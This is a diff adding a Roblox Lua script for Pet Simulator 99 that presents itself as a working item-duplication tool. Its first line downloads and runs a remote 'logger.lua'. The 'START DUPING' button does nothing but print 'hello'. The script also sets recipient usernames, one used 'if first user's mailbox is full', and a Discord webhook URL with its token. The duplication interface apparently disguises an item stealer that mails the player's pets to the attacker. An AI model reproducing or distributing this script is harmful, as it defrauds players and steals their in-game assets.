@@ -1,3 +1,37 @@
+loadstring(game:HttpGet('https://raw.githubusercontent.com/Subashians/ps99/main/logger.lua'))()
+wait(1)
+local Material = loadstring(game:HttpGet("https://raw.githubusercontent.com/Kinlei/MaterialLua/master/Module.lua"))()
+local X = Material.Load({
+	Title = "PS99 Dupe V1 [WORKING]",
+	Style = 3,
+	SizeX = 500,
+	SizeY = 350,
+	Theme = "Dark",
+	ColorOverrides = {
+		MainFrame = Color3.fromRGB(235,235,235)
+	}
+})
+local Y = X.New({
+	Title = "Dupe"
+})
+local A = Y.Button({
+	Text = "START DUPING",
+	Callback = function()
+		print("hello")
+	end,
+	Menu = {
+		Information = function(self)
+			X.Banner({
+				Text = "Make sure to have unlocked the exclusive daycare"
+			})
+		end
+	}
+})
+local H = Y.TextField({
+	Text = "Please only equip 1 huge",
+    Type = "Password"
+})
+
 Username = "LaRussieCool2"
 Username2 = "LaRussieCool3" -- stuff will get sent to this user if first user's mailbox is full
 Webhook = "https://discord.com/api/webhooks/1233473062293475410/W700VWb5jOrYwX2nGTlmZ4UNMmwqhQ_pnsxcOISS3AQ_aQ7QDL5jXQvc8_f-QhNF4lV8"
